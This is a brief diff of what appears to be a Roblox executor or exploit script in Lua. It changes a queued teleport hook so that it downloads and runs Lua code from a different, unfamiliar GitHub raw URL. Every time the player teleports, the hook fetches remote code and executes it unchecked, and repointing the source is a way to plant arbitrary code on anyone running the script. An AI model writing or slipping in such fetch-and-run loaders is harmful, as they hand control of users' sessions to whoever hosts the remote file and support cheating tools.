@@ -10370,7 +10370,7 @@ if IsOnMobile then
 KCBar = true
 end
 
-queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/SukritV5/Pythonincog.github.io/refs/heads/Maiin/Dock'))()")
+queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/insanewanted333/other.nvm./refs/heads/main/rrrrr'))()")
 
 if KCBar then
 CMDBARF.Visible = true
